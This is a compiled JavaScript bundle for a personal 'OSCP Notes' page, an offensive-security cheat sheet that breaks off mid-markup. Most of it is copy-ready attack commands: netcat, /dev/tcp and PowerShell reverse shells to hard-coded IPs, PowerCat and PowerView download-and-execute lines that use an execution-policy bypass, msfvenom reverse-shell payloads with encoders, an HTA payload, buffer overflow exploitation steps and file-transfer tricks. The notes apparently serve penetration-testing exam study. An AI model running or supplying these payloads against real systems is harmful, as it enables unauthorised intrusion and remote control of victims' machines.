(window.webpackJsonp=window.webpackJsonp||[]).push([[42],{383:function(t,s,a){"use strict";a.r(s);var e=a(13),r=Object(e.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"oscp-notes"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#oscp-notes"}},[t._v("#")]),t._v(" OSCP Notes")]),t._v(" "),s("h2",{attrs:{id:"bind-shell-vs-reverse-shell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#bind-shell-vs-reverse-shell"}},[t._v("#")]),t._v(" Bind shell vs reverse shell")]),t._v(" "),s("h3",{attrs:{id:"bind-shell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#bind-shell"}},[t._v("#")]),t._v(" Bind shell")]),t._v(" "),s("p",[t._v("Basically, we are opening a port with our shell for other people to execute")]),t._v(" "),s("ul",[s("li",[t._v("Client computer starts up a listening session with shell executing on that port")]),t._v(" "),s("li",[t._v("Connector just connects to the listening port that has shell already running")])]),t._v(" "),s("h3",{attrs:{id:"reverse-shell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#reverse-shell"}},[t._v("#")]),t._v(" Reverse shell")]),t._v(" "),s("p",[t._v("Basically, we are sending our own shell over to the operator")]),t._v(" "),s("ul",[s("li",[t._v("Operator listens on a port")]),t._v(" "),s("li",[t._v("Client computer connects to the listening port on the operator with the client's own shell")]),t._v(" "),s("li",[t._v("Operator now has control of clients shell")])]),t._v(" "),s("h4",{attrs:{id:"netcat-reverse-shell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#netcat-reverse-shell"}},[t._v("#")]),t._v(" Netcat reverse shell")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("nc")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("listening_host"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("listening_port"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-e")]),t._v(" /bin/bash\n")])])]),s("h4",{attrs:{id:"tcp-revsrse-shell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#tcp-revsrse-shell"}},[t._v("#")]),t._v(" TCP revsrse shell")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("/bin/bash "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-i")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /dev/tcp/"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("attacker_ip"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("/"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("port"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("0")]),t._v("<")]),s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("&1")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("2")]),t._v(">")]),s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("&1")]),t._v("\n")])])]),s("h4",{attrs:{id:"powercat-reverse-shell-example"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#powercat-reverse-shell-example"}},[t._v("#")]),t._v(" Powercat reverse shell example")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd\"\n")])])]),s("h4",{attrs:{id:"powershell-reverse-shell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#powershell-reverse-shell"}},[t._v("#")]),t._v(" Powershell reverse shell")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("powershell "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-nop")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-c")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"'),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$client")]),t._v(" = New-Object System.Net.Sockets.TCPClient('192.168.119.194',5555);"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$stream")]),t._v(" = "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$client")]),t._v(".GetStream();[byte[]]"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$bytes")]),t._v(" = 0..65535|%{0};while"),s("span",{pre:!0,attrs:{class:"token variable"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("((")]),t._v("$i "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" $stream.Read"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("$bytes"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" $bytes.Length"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("))")])]),t._v(" -ne 0){;"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$data")]),t._v(" = (New-Object -TypeName System.Text.ASCIIEncoding).GetString("),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$bytes")]),t._v(",0, "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$i")]),t._v(");"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$sendback")]),t._v(" = (iex "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$data")]),t._v(" 2>&1 | Out-String );"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$sendback2")]),t._v(" = "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$sendback")]),t._v(" + 'PS ' + (pwd).Path + '> ';"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$sendbyte")]),t._v(" = ([text.encoding]::ASCII).GetBytes("),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$sendback2")]),t._v(");"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$stream")]),t._v(".Write("),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$sendbyte")]),t._v(",0,"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$sendbyte")]),t._v(".Length);"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$stream")]),t._v(".Flush()};"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$client")]),t._v('.Close()"')]),t._v("\n")])])]),s("h2",{attrs:{id:"buffer-overflows"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#buffer-overflows"}},[t._v("#")]),t._v(" Buffer overflows")]),t._v(" "),s("ol",[s("li",[t._v("Search for buffer overflow vunlerability by determining at what length does the program crash")]),t._v(" "),s("li",[t._v("Search for where instruction pointer is overwritten by generating non-repeating payload then finding the offset at which "),s("code",[t._v("eip")]),t._v(" is overwritten")]),t._v(" "),s("li",[t._v("Find the bad characters by using all the possible hex values and looking at the stack to see which characters didn't make it through")]),t._v(" "),s("li",[t._v("Find which register points to somewhere in the stack where we can write to")]),t._v(" "),s("li",[t._v("Find an instruction that jumps to the register ie. "),s("code",[t._v("jmp esp")])]),t._v(" "),s("li",[t._v("Get that instructions address and overwrite "),s("code",[t._v("eip")]),t._v(" with that")]),t._v(" "),s("li",[t._v("Use the register's location and put our shell code there")])]),t._v(" "),s("h3",{attrs:{id:"create-pattern"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#create-pattern"}},[t._v("#")]),t._v(" Create pattern")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("msf-pattern_create "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-l")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("length"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])])]),s("h3",{attrs:{id:"pattern-offset-finder"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#pattern-offset-finder"}},[t._v("#")]),t._v(" Pattern offset finder")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("msf-pattern_offset "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-q")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("pattern_found"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])])]),s("h3",{attrs:{id:"generate-assembly-instruction-opcodes"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#generate-assembly-instruction-opcodes"}},[t._v("#")]),t._v(" Generate assembly instruction opcodes")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("msf-nasm_shell\nnasm "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("add")]),t._v(" eax,12\n00000000  83C00C            "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("add")]),t._v(" eax,byte +0xc\n")])])]),s("h3",{attrs:{id:"mona-finding-jmp-esp"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#mona-finding-jmp-esp"}},[t._v("#")]),t._v(" Mona finding jmp esp")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v("mona jmp "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-r")]),t._v(" esp\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# click view > log or press alt + L")]),t._v("\n")])])]),s("p",[t._v("or")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v("mona "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("find")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-s")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\xff\\xe4'")]),t._v("\n")])])]),s("h3",{attrs:{id:"bad-characters"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#bad-characters"}},[t._v("#")]),t._v(" Bad characters")]),t._v(" "),s("p",[s("strong",[t._v("Be aware that if a buffer overflow is strict on length, then some bad characters that don't make it through will result in the buffer overflow crash not being triggered.")])]),t._v(" "),s("p",[t._v("The following is missing "),s("code",[t._v("\\x00,\\x1A,\\x1D")])]),t._v(" "),s("div",{staticClass:"language-python extra-class"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[t._v("badchars "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0b\\x0c\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f"')]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40"')]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f"')]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f"')]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f"')]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf"')]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf"')]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),s("h3",{attrs:{id:"windows-reverse-tcp-shells"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#windows-reverse-tcp-shells"}},[t._v("#")]),t._v(" Windows reverse tcp shells")]),t._v(" "),s("h4",{attrs:{id:"shikata-ga-nai"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#shikata-ga-nai"}},[t._v("#")]),t._v(" Shikata ga nai")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-p")]),t._v(" windows/shell_reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("listening_host"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("listening_port"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("EXITFUNC")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("thread "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-f")]),t._v(" c "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-e")]),t._v(" x86/shikata_ga_nai "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-b")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("illegal characters as string ie. "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x00"}},[t._v("\\x00")]),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x12"}},[t._v("\\x12")]),t._v('..."')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])])]),s("h4",{attrs:{id:"fnstenv-mov"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#fnstenv-mov"}},[t._v("#")]),t._v(" Fnstenv mov")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-p")]),t._v(" windows/shell_reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("listening host"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("listening port"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-f")]),t._v(" c "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-e")]),t._v(" x86/fnstenv_mov "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-b")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x00"}},[t._v("\\x00")]),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x0a"}},[t._v("\\x0a")]),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x0d"}},[t._v("\\x0d")]),s("span",{pre:!0,attrs:{class:"token entity",title:"\\xff"}},[t._v("\\xff")]),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x3b"}},[t._v("\\x3b")]),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x45"}},[t._v("\\x45")]),t._v('..."')]),t._v("\n")])])]),s("h3",{attrs:{id:"linux-reverse-tcp-shells"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#linux-reverse-tcp-shells"}},[t._v("#")]),t._v(" Linux reverse tcp shells")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-p")]),t._v(" linux/x86/shell_reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".119.194 "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("443")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("EXITFUNC")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("thread "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-f")]),t._v(" c "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-e")]),t._v(" x86/shikata_ga_nai "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-b")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("illegal characters as string ie. "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x00"}},[t._v("\\x00")]),s("span",{pre:!0,attrs:{class:"token entity",title:"\\x12"}},[t._v("\\x12")]),t._v('..."')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])])]),s("h2",{attrs:{id:"leveraging-html-applications"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#leveraging-html-applications"}},[t._v("#")]),t._v(" Leveraging HTML applications")]),t._v(" "),s("h3",{attrs:{id:"msfvenom-hta-payload"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#msfvenom-hta-payload"}},[t._v("#")]),t._v(" msfvenom hta payload")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-p")]),t._v(" windows/shell_reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("listening_host"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("listening_port"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-f")]),t._v(" hta-psh "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-o")]),t._v(" evil.hta \n")])])]),s("p",[t._v("Next, serve the file on port 80")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" python "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-m")]),t._v(" SimpleHTTPServer "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v("\n")])])]),s("h2",{attrs:{id:"file-transfer"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#file-transfer"}},[t._v("#")]),t._v(" FIle transfer")]),t._v(" "),s("h3",{attrs:{id:"linux-to-windows"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#linux-to-windows"}},[t._v("#")]),t._v(" Linux to Windows:")]),t._v(" "),s("p",[s("strong",[t._v("IF USING FTP TRANFERRING BINARIES, REMEMBER TO USE FTP BINARY MODE FIRST")])]),t._v(" "),s("h4",{attrs:{id:"powershell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#powershell"}},[t._v("#")]),t._v(" Powershell")]),t._v(" "),s("p",[t._v("In powershell:")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$client")]),t._v(" = "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("new-object")]),t._v(" System"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Net"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("WebClient\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$client")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("DownloadFile"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://192.168.119.194/tmp.txt"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"C:\\tmp\\file.txt"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),s("p",[t._v("One line form:")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("new-object")]),t._v(" System"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Net"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("WebClient"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("DownloadFile"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'http://www.xyz.net/file.txt'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'C:\\tmp\\file.txt'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),s("h5",{attrs:{id:"executing-code-in-memory"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#executing-code-in-memory"}},[t._v("#")]),t._v(" Executing code in memory")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[t._v("powershell"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("exe "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("exec Bypass "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("noexit "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("C "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')\"")]),t._v("\n")])])]),s("h3",{attrs:{id:"windows-to-linux"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#windows-to-linux"}},[t._v("#")]),t._v(" Windows to linux")]),t._v(" "),s("p",[t._v("Create a python server and get it from the linux machine:")]),t._v(" "),s("p",[t._v("On windows:")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("python "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-m")]),t._v(" SimpleHTTPServer "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v("\n")])])]),s("p",[t._v("On linux:")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("wget")]),t._v(" http://"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("windows-machine-ip"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("/"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("file-name"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])])]),s("h4",{attrs:{id:"netcat"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#netcat"}},[t._v("#")]),t._v(" Netcat")]),t._v(" "),s("p",[t._v("In command prompt:")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[t._v("C:\\tools\\practical_tools\\nc"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("exe "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("nvlp 4455 > C:\\Users\\offset\\Desktop\\binary"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("exe\n")])])]),s("p",[t._v("In linux machine:")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("nc")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-w")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("windows_ip_here"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("4455")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v(" binary.exe\n")])])]),s("h3",{attrs:{id:"linux-to-linux"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#linux-to-linux"}},[t._v("#")]),t._v(" Linux to linux")]),t._v(" "),s("h4",{attrs:{id:"wget"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#wget"}},[t._v("#")]),t._v(" Wget")]),t._v(" "),s("div",{staticClass:"language-sh 